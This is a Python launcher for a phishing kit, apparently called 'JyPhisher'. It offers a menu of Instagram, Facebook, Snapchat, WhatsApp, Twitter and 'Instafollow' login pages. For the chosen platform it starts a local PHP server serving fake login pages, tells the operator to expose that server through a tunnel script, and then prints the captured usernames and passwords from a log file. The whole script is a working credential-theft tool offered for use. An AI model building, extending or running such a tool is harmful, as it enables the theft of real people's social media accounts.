# -*- coding: UTF-8 -*-
from termcolor import colored
import os, sys, time
# Normal
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"  
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"
# Bold
bblack="\033[1;30m"
bred="\033[1;31m"
bgreen="\033[1;32m"
byellow="\033[1;33m"
bblue="\033[1;34m"
bpurple="\033[1;35m"
bcyan="\033[1;36m"
bwhite="\033[1;37m"

logo='''
'''+green+'''     _       ____  _     _     _               
'''+red+'''    | |_   _|  _ \| |__ (_)___| |__   ___ _ __ 
'''+cyan+''' _  | | | | | |_) | '_ \| / __| '_ \ / _ \ '__|
'''+yellow+'''| |_| | |_| |  __/| | | | \__ \ | | |  __/ |   
'''+blue+''' \___/ \__, |_|   |_| |_|_|___/_| |_|\___|_|   
'''+purple+'''       |___/                By JayTrimbake                   
'''+green+'''                             
             Github: https://github.com/JayTrimbake       
             Insta: https://www.instagram.com/_.jay.___14/
             YouTube: https://www.youtube.com/channel/UCPcgqEH9d3Cx6l4RqYuF7LA
'''
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)
slowprint(logo)

print(blue,"Choice Below Options")
print(yellow,"""
     1.Instagram
     2.Facebook
     3.Snapchat
     4.Whatsapp
     5.Twitter
     6.Instafollow
""")
user9 = input(colored("Here: ",'cyan'))

if user9 == "1":

 print(yellow,"[+] Startting PHP Server ....... ")
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py") 
 os.system("cd instagram && php -S localhost:8484")
  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

if user9 == "2":

 print(yellow,"[+] Startting PHP Server .......")
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py") 
 os.system("cd facebook && php -S localhost:8484")  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

if user9 == "3":

 print(yellow,"[+] Startting PHP Server .......") 
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py")
 os.system("cd snapchat && php -S localhost:8484")  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

if user9 == "4":

 print(yellow,"[+] Startting PHP Server .......")
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py") 
 os.system("cd whatsapp-phishing && php -S localhost:8484")  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

if user9 == "5":

 print(yellow,"[+] Startting PHP Server .......")
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py") 
 os.system("cd twitter && php -S localhost:8484")  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

if user9 == "6":

 print(yellow,"[+] Startting PHP Server .......") 
 print(yellow,"[+] Now open another terminal and run sudo python3 tunnel.py")
 os.system("cd instafollow && php -S localhost:8484")  
else:
 print(red,"Subscribe My Youtube Channel.Thank You..")

user6 = input(colored("[+] Do you want to see User and Pass y/n: ",'cyan'))
if user6 == "y":
 print(yellow,"""
     1.Instagram
     2.Facebook
     3.Snapchat
     4.Whatsapp
     5.Twitter
     6.Instafollow """)
 pass1 = input(colored("Here: ",'cyan'))
if pass1 == "1":
 os.system("cd instagram && cat log.txt")
if pass1 == "2":
 os.system("cd facebook && cat log.txt")
if pass1 == "3":
 os.system("cd snapchat && cat log.txt")
if pass1 == "4":
 os.system("cd whatsapp-phishing && cat log.txt")
if pass1 == "5":
 os.system("cd twitter && cat log.txt")
if pass1 == "6":
 os.system("cd instafollow && cat log.txt")
else:
  print("Thank you")




